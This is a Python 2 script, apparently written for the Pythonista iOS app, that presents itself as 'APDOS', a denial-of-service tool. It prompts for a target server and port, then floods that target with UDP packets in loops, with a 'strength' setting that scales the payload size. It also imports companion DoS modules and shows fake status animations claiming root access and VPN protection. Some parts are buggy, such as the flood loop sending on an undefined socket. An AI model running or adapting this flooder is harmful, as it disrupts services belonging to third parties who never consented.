import socket, sys, os, time, itertools, threading, speech, console, argparse, string

parser = argparse.ArgumentParser()
parser.add_argument("-d", "--daemon",help="Starts Daemon DOS",action="store_true")
parser.add_argument("-s", "--strength",help="Controls How Strong The Attack Is (0-9)",type=int,default=1)
parser.add_argument("-v", "--verbose",help="Detailed Startup",action="store_true")
parser.add_argument("-r", "--rainbow",help="Rainbow Text!",action="store_true")
parser.add_argument("-n", "--nohelp",help="Hides Help",action="store_true")
parser.add_argument("-c", "--color",help="Change Color Theme",default="red")
args = parser.parse_args()

if not args.nohelp:
	parser.print_help()

daemon = args.daemon
verbose = args.verbose
strength = args.strength

console.set_font()
console.set_color()
if len(sys.argv) > 1:
	pass
else:
	print ""
	print "      -+--=:=-  -+-  -=:=--+-"
	console.set_color(0, 130, 0)
	print "        Please Set sys.argv"
	console.set_color()
	print "      -+--=:=-  -+-  -=:=--+-"
	console.set_color(0, 130, 0)
	print "               Usage"
	print "        <Strength> <Colour>"
	console.set_color()
	print "      -+--=:=-  -+-  -=:=--+-"
	print ""
	print "      -+--=:=-  -+-  -=:=--+-"
	console.set_color(1, 1, 1)
	print "       -+- Color Options -+-"
	console.set_color()
	print "      -+--=:=-  -+-  -=:=--+-"
	console.set_color(1,1,1)
	print "            - rainbow -      "
	console.set_color(255, 0, 0)
	print "      -+--=:=-  red  -=:=--+-"
	console.set_color(255, 255, 0)
	print "      -+--=:=- yellow -=:=-+-"
	console.set_color(0, 255, 0)
	print "      -+--=:=- green -=:=--+-"
	console.set_color(0, 255, 255)
	print "      -+--=:=-  aqua -=:=--+-"
	console.set_color(0, 0, 255)
	print "      -+--=:=-  blue -=:=--+-"
	console.set_color(255, 0, 255)
	print "      -+--=:=-  sexy -=:=--+-"
	console.set_color()
	sys.exit()
if args.color == "blue":
	color = "blue"
if args.color == "red":
	color = "red"
if args.color == "green":
	color = "green"
if args.color == "yellow":
	color = "yellow"
if args.color == "aqua":
	color = "aqua"
if args.color == "sexy":
	color = "sexy"
if args.color == "rainbow":
	color = "red"
if len(sys.argv[1]) == 0:
	import thelogo
if verbose:
	import APDOS_Debug
if daemon:
	import DaemonDos
console.set_font('System-Bold', 15)
print "###################################"
try:
	if color == "blue":
		console.set_color(0, 0, 130)
	if color == "red":
		console.set_color(130, 0, 0)
	if color == "yellow":
		console.set_color(130, 130, 0)
	if color == "aqua":
		console.set_color(0, 130, 130)
	if color == "sexy":
		console.set_color(130, 0, 130)
	if color == "green":
		console.set_color(0, 130, 0)
except:
	console.set_color(130, 0, 0)
print "     _    ____  ____   ___  ____ "
print "    / \  |  _ \|  _ \ / _ \/ ___|"
print "   / _ \ | |_) | | | | | | \___ \ "
print "  / ___ \|  __/| |_| | |_| |___) )"
print " /_/   \_\_|   |____/ \___/|____/ "
print ""
console.set_color()
print "###################################"
print ""
console.set_font()
if args.rainbow:
	import random
	console.set_color(130, 0, 0)
	print "\n     -+--=:=-  -++-  -=:=--+-"
	console.set_color()
	console.set_font('HoeflerText-Black')
	print " " * 32 + "SavageSecurity"
	console.set_font()
	console.set_color(130, 0, 0)
	print "     -+--=:=-  -++-  -=:=--+-\n"
	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	data = "".join(random.sample(string.ascii_letter*200,1024) * args.strength)
	target = raw_input(' -+- Target: ')
	port = input(' -+- Port: ')
	duration = input(' -+- Run: ')
	console.set_color()
	print ""
	timeout = time.time() + duration
	hue = 0.45
	sent = 0
	from colorsys import hsv_to_rgb
	while 1:
		try:
			if time.time() > timeout:
				break		
			else:
				pass
		except KeyboardInterrupt:
			console.set_color()
			sys.exit()
		try:
			s.sendto(data, (target, port))
			s.sendto(data, (target, port))
			s.sendto(data, (target, port))
			s.sendto(data, (target, port))
			s.sendto(data, (target, port))
		except:
			pass
		sent = sent + 5
		try:
			r, g, b = hsv_to_rgb(hue, 1.0, 0.8)
			console.set_color(r, g, b)
			hue += 0.001
			print "%s Packets: %s Port: %s " %(sent, victim, vport)
		except KeyboardInterrupt:
			console.set_color()
			sys.exit()
	console.set_color()
	sys.exit()
print "     -=-+- -+-=-  -=-+- -+-=-"
console.set_font('AmericanTypewriter', 15)
print " " * 29 + "- APDOS -"
console.set_font()
print "     -=-+- -+-=-  -=-+- -+-=-"
print "     -+-=-    Version   -=-+-"
print "     -+-=-     GREAT    -=-+-"
print "     -+-=-    OKAYISH   -=-+-"
print "     -+-=-   FEEDBACKS  -=-+-"
print "     -=-+- -+-=-  -=-+- -+-=-"
version = raw_input("     -+-=- ")
print "     -=-+- -+-=-  -=-+- -+-=-\n"
time.sleep(1)
try:
	if color == "blue":
		console.set_color(0, 0, 130)
	if color == "red":
		console.set_color(130, 0, 0)
	if color == "yellow":
		console.set_color(130, 130, 0)
	if color == "aqua":
		console.set_color(0, 130, 130)
	if color == "sexy":
		console.set_color(130, 0, 130)
	if color == "green":
		console.set_color(0, 130, 0)
except:
	console.set_color(130, 0, 0)
server = raw_input("[ ] SERVER: ")
port = raw_input("[ ] PORT: ")
type = raw_input("[ ] PAYLOAD: ")
console.set_color()
if port == '':
	port = 80
if type == "skip":
	type = "0x552810401b"
	def udp():
		import RoDOS
		import console
		try:
			if color == "blue":
				console.set_color(0, 0, 130)
			if color == "red":
				console.set_color(130, 0, 0)
			if color == "yellow":
				console.set_color(130, 130, 0)
			if color == "aqua":
				console.set_color(0, 130, 130)
			if color == "sexy":
				console.set_color(130, 0, 130)
			if color == "green":
				console.set_color(0, 130, 0)
		except:
			console.set_color(130, 0, 0)
		print ""
		print "      -=-+- -+-=-  -=-+- -+-=-"
		print "         - APDOS COMPLETE -   "
		print "      -=-+- -+-=-  -=-+- -+-=-"
		console.set_color()
		quit()
	def feed():
		import apdosFEED
		import console
		try:
			if color == "blue":
				console.set_color(0, 0, 130)
			if color == "red":
				console.set_color(130, 0, 0)
			if color == "yellow":
				console.set_color(130, 130, 0)
			if color == "aqua":
				console.set_color(0, 130, 130)
			if color == "sexy":
				console.set_color(130, 0, 130)
			if color == "green":
				console.set_color(0, 130, 0)
		except:
			console.set_color(130, 0, 0)
		print ""
		print "      -=-+- -+-=-  -=-+- -+-=-"
		print "         - APDOS COMPLETE -   "
		print "      -=-+- -+-=-  -=-+- -+-=-"
		console.set_color()
		quit()
	if (version == "GREAT"):
		udp()
	if (version == "g"):
		udp()
	if (version == "G"):
		udp()
	if (version == "great"):
		udp()
	if (version == "f"):
		feed()
	if (version == "F"):
		feed()
	if (version == "feedbacks"):
		feed()
	if (version == "FEEDBACKS"):
		feed()
	def attack():
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
		s.sendto(type, (server, int(port)))
		print "Data: " + type
		print "Server: " + server + ":" + port
		s.close()
	for i in range(1, 1000):
		attack()
	import console
	try:
			if color == "blue":
				console.set_color(0, 0, 130)
			if color == "red":
				console.set_color(130, 0, 0)
			if color == "yellow":
				console.set_color(130, 130, 0)
			if color == "aqua":
				console.set_color(0, 130, 130)
			if color == "sexy":
				console.set_color(130, 0, 130)
			if color == "green":
				console.set_color(0, 130, 0)
	except:
		console.set_color(130, 0, 0)
	print ""
	print "      -=-+- -+-=-  -=-+- -+-=-"
	print "         - APDOS COMPLETE -   "
	print "      -=-+- -+-=-  -=-+- -+-=-"
	console.set_color()
	sys.exit()
print ""
print "-+--=- " + server  + " -=--+-\n"
print "-+--=- " + type + " -=--+-"
done = False
def animate():
	for c in itertools.cycle(['|', '/', '-', '\\']):
		if done:
			break
		sys.stdout.write('\rLocating         ' + c)
		sys.stdout.flush()
		time.sleep(0.1)
	sys.stdout.write('\rLocating    [COMPLETE]\n     ')
t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done = True
done1 = False
def animate():
	for d in itertools.cycle(['|', '/', '-', '\\']):
		if done1:
			break
		sys.stdout.write('\rConnecting       ' + d)
		sys.stdout.flush()
		time.sleep(0.1)
	sys.stdout.write('\rConnecting  [COMPLETE]\n     ')
t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done1 = True
time.sleep(0.5)
done2 = False
def animate():
	for c in itertools.cycle(['|', '/', '-', '\\']):
		if done2:
			break
		sys.stdout.write('\rActivation       ' + c)
		sys.stdout.flush()
		time.sleep(0.1)
	sys.stdout.write('\rActivation  [COMPLETE]\n     ')
t = threading.Thread(target=animate)
t.start()
time.sleep(3)
done2 = True
time.sleep(0.5)
done = False
def animate():
	for c in itertools.cycle(['|', '/', '-', '\\']):
		if done:
			break
		sys.stdout.write('\rBooting          ' + c)
		sys.stdout.flush()
		time.sleep(0.1)
	sys.stdout.write('\rBooting     [COMPLETE]\n     ')
t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done = True
time.sleep(0.5)
done1 = False
def animate():
	for d in itertools.cycle(['|', '/', '-', '\\']):
		if done1:
			break
		sys.stdout.write('\rROOT:    ' + d)
		sys.stdout.flush()
		time.sleep(0.1)
	sys.stdout.write('\rROOT:  [YES]\n')
t = threading.Thread(target=animate)
t.start()
time.sleep(2)
done1 = True
time.sleep(0.5)
donea = False
def animate():
	for d in itertools.cycle(['|', '/', '-', '\\']):
		if done:
			break
		sys.stdout.write('\rVPNS:    ' + d)
		sys.stdout.flush()
		time.sleep(0.1)
	try:
		from urllib2 import urlopen
		myip = urlopen('http://ip.42.pl/raw').read()
		hname = socket.gethostbyaddr(myip)
		vpn = "[NO]"
	except:
		vpn = "[YES]"
	sys.stdout.write('\rVPNS:  ' + vpn + '\n')
t = threading.Thread(target=animate)
t.start()
time.sleep(2)
donea = True
donea = False
def animate():
	for d in itertools.cycle(['|', '/', '-', '\\']):
		if done:
			break
		sys.stdout.write('\rAUTH:    ' + d)
		sys.stdout.flush()
		time.sleep(0.1)
	sys.stdout.write('\rAUTH:  [YES]\n     ')
t = threading.Thread(target=animate)
t.start()
time.sleep(2)
donea = True
donea = False
def animate():
	for d in itertools.cycle(['|', '/', '-', '\\']):
		if done:
			break
		sys.stdout.write('\rDDOS:    ' + d)
		sys.stdout.flush()
		time.sleep(0.1)
	sys.stdout.write('\rDDOS:  [YES]\n     ')
t = threading.Thread(target=animate)
t.start()
time.sleep(2)
done = True
donea = False
def animate():
	for d in itertools.cycle(['|', '/', '-', '\\']):
		if done:
			break
		conn = socket.getservbyport(int(port))
		sys.stdout.write('\r' + conn + ':' + '         ' + d)
		sys.stdout.flush()
		time.sleep(0.1)
	conn = socket.getservbyport(int(port))
	sys.stdout.write('\r' + conn + ':' + '  ' + '[YES]\n')
t = threading.Thread(target=animate)
t.start()
time.sleep(2)
donea = True
def udp():
	from RoDOS import byt
	byt(strength)
	import RoDOS
	import console
	try:
			if color == "blue":
				console.set_color(0, 0, 130)
			if color == "red":
				console.set_color(130, 0, 0)
			if color == "yellow":
				console.set_color(130, 130, 0)
			if color == "aqua":
				console.set_color(0, 130, 130)
			if color == "sexy":
				console.set_color(130, 0, 130)
			if color == "green":
				console.set_color(0, 130, 0)
	except:
		console.set_color(130, 0, 0)
	print ""
	print "      -=-+- -+-=-  -=-+- -+-=-"
	print "         - APDOS COMPLETE -   "
	print "      -=-+- -+-=-  -=-+- -+-=-"
	console.set_color()
	quit()
def feed():
	import apdosFEED
	import console
	try:
			if color == "blue":
				console.set_color(0, 0, 130)
			if color == "red":
				console.set_color(130, 0, 0)
			if color == "yellow":
				console.set_color(130, 130, 0)
			if color == "aqua":
				console.set_color(0, 130, 130)
			if color == "sexy":
				console.set_color(130, 0, 130)
			if color == "green":
				console.set_color(0, 130, 0)
	except:
		console.set_color(130, 0, 0)
	print ""
	print "      -=-+- -+-=-  -=-+- -+-=-"
	print "         - APDOS COMPLETE -   "
	print "      -=-+- -+-=-  -=-+- -+-=-"
	console.set_color()
	quit()
if (version == "GREAT"):
	udp()
if (version == "g"):
	udp()
if (version == "G"):
	udp()
if (version == "great"):
	udp()
if (version == "f"):
	feed()
if (version == "F"):
	feed()
if (version == "feedbacks"):
	feed()
if (version == "FEEDBACKS"):
	feed()
def attack():
	type = "0x7392a88716b"
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
	s.sendto(type, (server, int(port)))
	print "Data: " + type
	print "Server: " + server + ":" + port
	s.close()
for i in range(1, 1000):
	attack()
try:
	if color == "blue":
		console.set_color(0, 0, 130)
	if color == "red":
		console.set_color(130, 0, 0)
	if color == "yellow":
		console.set_color(130, 130, 0)
	if color == "aqua":
		console.set_color(0, 130, 130)
	if color == "sexy":
		console.set_color(130, 0, 130)
	if color == "green":
		console.set_color(0, 130, 0)
except:
	console.set_color(130, 0, 0)
print ""
print "      -=-+- -+-=-  -=-+- -+-=-"
print "         - APDOS COMPLETE -   "
print "      -=-+- -+-=-  -=-+- -+-=-"
console.set_color()
sys.exit()
